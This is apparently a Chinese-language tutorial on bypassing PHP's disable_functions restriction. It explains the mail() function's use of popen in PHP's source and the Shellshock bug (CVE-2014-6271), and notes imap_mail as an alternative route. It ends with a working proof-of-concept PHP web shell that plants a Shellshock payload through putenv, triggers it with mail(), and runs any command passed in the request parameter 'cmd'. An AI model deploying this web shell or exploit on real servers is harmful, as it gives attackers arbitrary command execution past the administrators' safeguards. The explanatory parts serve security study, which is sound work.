看一下php manual手册中的定义

```
disable_classes string
本指令可以使你出于安全的理由禁用某些类。用逗号分隔类名。disable_classes 不受安全模式的影响。 本指令只能设置在 php.ini 中。例如不能将其设置在 httpd.conf。
```
php中有一个table存放已定义的函数
disabled_function的原理便是，将函数名从这个table删除。对于绕过disabled_function的话，
总共有几种方式


```
1、加载so文件，模块文件
2、找到生僻的函数，里面带有执行命令
3、一些第三方的漏洞，比如exim、破壳漏洞
```


绕过1: mail函数

参考 https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html

```
char *sendmail_path = INI_STR("sendmail_path"); 
char *sendmail_cmd = NULL;
...
if (extra_cmd != NULL) {
	spprintf(&sendmail_cmd, 0, "%s %s", sendmail_path, extra_cmd);
} else {
	sendmail_cmd = sendmail_path;
}
...
#ifdef PHP_WIN32 
  sendmail = popen_ex(sendmail_cmd, "wb", NULL, NULL TSRMLS_CC); 
#else 
  /* Since popen() doesn't indicate if the internal fork() doesn't work 
   * (e.g. the shell can't be executed) we explicitly set it to 0 to be 
   * sure we don't catch any older errno value. */ 
  errno = 0; 
  sendmail = popen(sendmail_cmd, "w"); 
#endif
```

sendmail_path是从php.ini获取过来的，默认是`/usr/sbin/sendmail -t -i`, extra_cmd 是mail函数的第五个参数


extra_cmd（用户传入的一些额外参数）存在的时候，调用spprintf将sendmail_path和extra_cmd组合成真正执行的命令sendmail_cmd 。不存在则直接将sendmail_path赋值给sendmail_cmd 。  最后调用popen执行senmail_cmd命令.


如果系统默认sh是bash，popen会派生bash进程。而之前的bash破壳（CVE-2014-6271）漏洞，直接导致我们可以利用mail()函数执行任意命令，绕过disable_functions。 

> 同样，我们搜索一下php的源码，可以发现，明里调用popen派生进程的php函数还有imap_mail，如果你仅仅通过禁用mail函数来规避这个安全问题，那么imap_mail是可以做替代的。当然，php里还可能有其他地方有调用popen或其他能够派生bash子进程的函数，通过这些地方，都可以通过破壳漏洞执行命令的。

poc:

```
<?php 
function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
   $tmp = tempnam(".","data"); 
   putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1"); 
   // In Safe Mode, the user may only alter environment variableswhose names 
   // begin with the prefixes supplied by this directive. 
   // By default, users will only be able to set environment variablesthat 
   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
   // PHP will let the user modify ANY environment variable! 
   mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail 
   $output = @file_get_contents($tmp); 
   @unlink($tmp); 
   if($output != "") return $output; 
   else return "No output, or not vuln."; 
} 
echo shellshock($_REQUEST["cmd"]); 
?>
```
